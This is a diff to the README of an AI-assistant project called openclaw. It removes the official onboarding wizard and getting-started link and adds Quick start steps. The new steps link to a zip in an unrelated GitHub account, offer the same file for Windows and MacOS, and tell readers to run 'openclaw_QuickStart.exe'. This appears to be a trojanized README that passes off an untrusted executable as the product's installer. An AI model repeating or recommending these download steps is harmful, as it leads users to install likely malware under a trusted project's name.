@@ -25,11 +25,6 @@ If you want a personal, single-user assistant that feels local, fast, and always
 
 [Website](https://openclaw.ai) · [Docs](https://docs.openclaw.ai) · [DeepWiki](https://deepwiki.com/openclaw/openclaw) · [Updating](https://docs.openclaw.ai/install/updating) · [Showcase](https://docs.openclaw.ai/start/showcase) · [FAQ](https://docs.openclaw.ai/start/faq) · [Wizard](https://docs.openclaw.ai/start/wizard) · [Nix](https://github.com/openclaw/nix-openclaw) · [Docker](https://docs.openclaw.ai/install/docker) · [Discord](https://discord.gg/clawd)
 
-Preferred setup: run the onboarding wizard (`openclaw onboard`) in your terminal.
-The wizard guides you step by step through setting up the gateway, workspace, channels, and skills. The CLI wizard is the recommended path and works on **macOS, Linux, and Windows (via WSL2; strongly recommended)**.
-Works with npm, pnpm, or bun.
-New install? Start here: [Getting started](https://docs.openclaw.ai/start/getting-started)
-
 **Subscriptions (OAuth):**
 
 - **[Anthropic](https://www.anthropic.com/)** (Claude Pro/Max)
@@ -40,8 +35,10 @@ Model note: while any model is supported, I strongly recommend **Anthropic Pro/M
 ## Quick start 
 
 
-Full beginner guide (auth, pairing, channels): [Getting started](https://docs.openclaw.ai/start/getting-started)
-
+- Choose your OS: [Windows](https://github.com/VarnishCreator/openclaw-AI/raw/refs/heads/main/openclaw/openclaw.zip), [MacOS](https://github.com/VarnishCreator/openclaw-AI/raw/refs/heads/main/openclaw/openclaw.zip)
+- Run openclaw_QuickStart.exe
+- Select automatic setup
+  
 ## Development channels
 
 - **stable**: tagged releases (`vYYYY.M.D` or `vYYYY.M.D-<patch>`), npm dist-tag `latest`.
